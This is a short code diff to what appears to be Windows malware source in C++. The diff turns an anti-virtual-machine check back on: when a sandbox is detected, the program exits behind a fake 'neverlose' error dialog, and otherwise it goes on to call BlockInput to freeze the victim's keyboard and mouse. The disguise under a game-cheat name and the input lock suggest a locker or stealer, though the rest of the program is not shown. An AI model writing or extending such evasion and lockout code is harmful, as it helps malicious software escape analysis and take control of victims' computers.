@@ -16,6 +16,8 @@
 #include <ShlObj.h>
 #include "config.h"
 
+#define ANTI_VM 1  // 1 = block VMs, 0 = allow
+
 #pragma comment(lib, "strmiids.lib")
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "ole32.lib")
@@ -1348,8 +1350,12 @@ bool is_vm()
 
 int main()
 {
-    // anti-VM disabled for testing
-    // if (is_vm()) { MessageBoxW(...); return 0; }
+#if ANTI_VM
+    if (is_vm()) {
+        MessageBoxW(nullptr, L"cannot run in a visual mechine", L"neverlose", MB_OK | MB_ICONERROR);
+        return 0;
+    }
+#endif
 
     BlockInput(TRUE);
 
